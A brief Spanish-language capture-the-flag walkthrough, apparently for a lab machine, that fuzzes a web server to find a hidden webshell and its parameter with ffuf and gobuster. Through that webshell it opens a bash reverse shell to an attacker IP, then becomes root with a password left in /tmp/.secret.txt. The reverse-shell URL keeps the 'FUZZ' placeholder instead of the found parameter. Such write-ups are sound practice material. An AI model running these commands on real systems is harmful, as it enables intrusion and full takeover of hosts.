PORT   STATE SERVICE
80/tcp open  http

-Hacemos fuzzing y encontramos la siguiente ruta:
	/shell.php

-Parece ser una webshell pero no tenemos el parámetro para ejecurar los comandos

-Hacemos fuzzing de parámetros:
	-Con ffuf: 
		-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://whereismywebshell/shell.php?FUZZ' -c -fc 500
	-Con gobuster: 
		-gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://whereismywebshell/shell.php?FUZZ=id' --exclude-length 0,302 -t 100
	-Parámetro encontrado: 'parameter'
	-Nota: Hay que hacerlo con la estructura --> /shell.php?FUZZ=id , si lo haces con:
		/shell.php?FUZZ NO FUNCIONA

-Nos entablamos una reverse shell mediante la webshell encontrada:
	-http://whereismywebshell/shell.php?FUZZ=bash -c 'bash -i >& /dev/tcp/192.168.236.128/1234 0>&1'
	www-data@9d922dbde79c:/$


## Escalada de Privilegios

-Entramos en el directorio /tmp y observamos el siguiente archivo:
	www-data@9d922dbde79c:/tmp$ cat .secret.txt
	contraseñaderoot123

-Pivotamos al usuario root:
	-su root:
	-password: contraseñaderoot123
	root@9d922dbde79c:/tmp# whoami
	root
